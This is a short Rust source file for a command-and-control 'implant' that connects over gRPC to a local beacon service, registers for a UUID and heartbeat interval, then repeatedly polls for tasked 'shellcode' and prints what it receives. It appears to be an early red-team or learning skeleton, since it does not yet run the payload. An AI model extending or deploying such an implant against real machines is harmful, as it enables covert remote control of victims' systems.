use std::time::Duration;

use tasks::{beacon_service_client::BeaconServiceClient, ConnectionRequest, PollRequest};
use tokio::time;
use tonic::transport::Channel;
pub mod tasks {
    tonic::include_proto!("tasks");
}

struct Implant {
    client: BeaconServiceClient<Channel>,
    uuid: String,
    pub heartbeat: u32,
}

impl Implant {
    pub async fn connect(url: &'static str) -> Result<Self, Box<dyn std::error::Error>> {
        let mut client = BeaconServiceClient::connect(url).await?;
        let response = client
            .connection(tonic::Request::new(ConnectionRequest {}))
            .await?
            .into_inner();
        println!("Connect: RESPONSE={:?}", response);

        Ok(Self {
            client,
            uuid: response.uuid,
            heartbeat: response.heartbeat,
        })
    }

    pub async fn poll(&mut self) -> Result<Option<String>, Box<dyn std::error::Error>> {
        let response = self
            .client
            .poll(tonic::Request::new(PollRequest {
                uuid: self.uuid.clone(),
            }))
            .await?
            .into_inner();

        println!("Poll: RESPONSE={:?}", response);

        Ok(response.shellcode)
    }

    // pub fn jitter(&self) -> u64 {}
}

#[tokio::main]
async fn main() -> Result<(), Box<dyn std::error::Error>> {
    let mut implant = Implant::connect("http://[::1]:50055").await?;

    let mut interval = time::interval(Duration::from_millis(implant.heartbeat.into()));
    loop {
        interval.tick().await;

        if let Some(s) = implant.poll().await? {
            println!("Shellcode: {s}");
        }
    }
}
